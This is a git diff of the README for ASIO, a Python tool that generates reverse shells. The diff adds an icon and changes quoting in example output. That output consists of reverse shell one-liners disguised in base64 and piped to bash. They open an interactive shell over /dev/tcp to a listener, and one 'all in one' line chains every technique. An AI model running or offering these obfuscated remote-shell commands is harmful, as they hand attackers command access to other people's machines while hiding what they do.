@@ -1,3 +1,7 @@
+<p align="center">
+<img src="icon.png">
+</p>
+
 # ASIO
 ## Description
 ASIO (All Shell In One) is a tool written in Python3 that generates reverse shells. It has the ability to **cast a one liner that uses all the available reverse shell teqniques**
@@ -37,10 +41,10 @@ Command:
 Output:
 ```
  sh in dev tcp 
-echo "IHNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS84MDgwIDA+JjE=" | base64 -d | bash
+echo IHNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS84MDgwIDA+JjE= | base64 -d | bash
 
 exec sh in dev tcp 
-echo "IDA8JjE5NjtleGVjIDE5Njw+L2Rldi90Y3AvMTI3LjAuMC4xLzgwODA7IHNoIDwmMTk2ID4mMTk2IDI+JjE5Ng==" | base64 -d | bash
+echo IDA8JjE5NjtleGVjIDE5Njw+L2Rldi90Y3AvMTI3LjAuMC4xLzgwODA7IHNoIDwmMTk2ID4mMTk2IDI+JjE5Ng== | base64 -d | bash
 ```
 
 ### Generate one liner with all the available teqniques encoded in base64
@@ -51,7 +55,7 @@ Command:
 Output:
 ```
  All in one
-echo "KCBzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjE<more base64>" | base64 -d | bash
+echo KCBzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjE<more base64> | base64 -d | bash
 ```
 
 
